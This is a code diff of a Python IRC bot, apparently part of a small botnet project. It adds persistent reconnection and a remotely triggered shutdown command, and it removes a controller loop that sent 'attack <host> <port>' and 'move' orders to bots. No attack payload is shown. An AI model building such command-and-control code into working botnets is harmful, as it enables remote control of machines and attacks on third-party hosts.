@@ -12,7 +12,7 @@ class Bot:
         self.PHRASE = phrase
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # CONTROLLER INFO
-        self.botNick = "SLAVE77"
+        self.botNick = "SLAVE778"
         self.liveConnection = False # Flag to see if controller connection to IRC Server is active
         self.command = None
 
@@ -24,11 +24,8 @@ class Bot:
         self.botsDisconnected = []
         self.acceptedCons = []
 
-        try:
-            self.IRCSOCKET.connect((self.HOST, self.PORT))
-        except Exception as e:
-            sys.stderr.write("Error: " + str(e))
-            sys.exit(0)
+        self.connectLoop()
+
 
         
 
@@ -40,9 +37,15 @@ class Bot:
         print(resp)
         return "433" in resp
 
-    # PingPong protocol
-    def pong(self):
-        pass
+    def connectLoop(self):
+        while not self.liveConnection:
+            try:
+                self.IRCSOCKET.connect((self.HOST, self.PORT))
+                self.liveConnection = True
+            except Exception as e:
+                print("{} Trying to reconnect..." .format(e))
+                time.sleep(5)
+                continue
 
     # Get response from Bot 
     def getData(self):
@@ -61,7 +64,14 @@ class Bot:
             print("from " + prefix + " to do " + message)
             if message == "status":
                 print("sending back status")
-                self.privateMsg(prefix, "!STATUS! " + self.botNick)
+                self.privateMsg(prefix, "Correct pass - " + self.botNick)
+            if message == "shutdown":
+                print("shutting down")
+                self.privateMsg(prefix, "Shutdown successful - " + self.botNick)
+                self.IRCSOCKET.close()
+                sys.exit(0)
+                    
+
         
 
     def reader(self):
@@ -81,44 +91,10 @@ class Bot:
                             self.createNick(self.NICK)
                             self.connectIRC(self.s,self.NICK, self.chan)  
         except Exception as e:
-            print("Exception: ")
-            print(e)
-            print("Reconnecting in 5 seconds ...")
-            time.sleep(5)
+            while not self.liveConnection:
+                time.sleep(5)
             self.reader()
 
-
-    def commandHandler(self):
-        while True:
-
-            userCommand = input("command> ")
-            self.command = userCommand.split()
-            # somewhere send phrase to bot
-            # check command
-            # send command to bots for them to do
-            if (self.command[0] == "status"):
-                self.botlist = []
-                self.sendCommand(self.command[0])
-                time.sleep(5)
-
-            elif (self.command[0] == "attack"):
-                if (len(self.command) == 3):
-                    self.botsSuccessful = []
-                    self.botsFailed = []
-                    self.sendCommand(userCommand)
-                else:
-                    print("Incorrect usage of command: attack <host-name> <port>")
-            elif (self.command[0] == "move"):
-                if(len(self.command) == 4):
-                    self.botsMoved = []
-                    self.sendCommand(userCommand)
-                else:
-                    print("Incorrect usage of command: move <host-name> <port> <channel>")
-            elif (self.command[0] == "quit"):
-                sys.exit(0)
-            elif (self.command[0] == "shutdown"):
-                self.botsDisconnected = []
-                self.sendCommand(self.command[0])
             
 def main():
     
@@ -145,12 +121,10 @@ def main():
     while True:
         
         # set up controller bot and try to connect to the IRC
-        try:
-            print("setting up bot")
-            bot.setup(HOST, PORT, CHANNEL, PHRASE)
-        except Exception as e:
-            print("{} Trying to reconnect..." .format(e))
-            continue
+
+        print("setting up bot")
+        bot.setup(HOST, PORT, CHANNEL, PHRASE)
+
 
         print("bot set up")
         print("connecting")
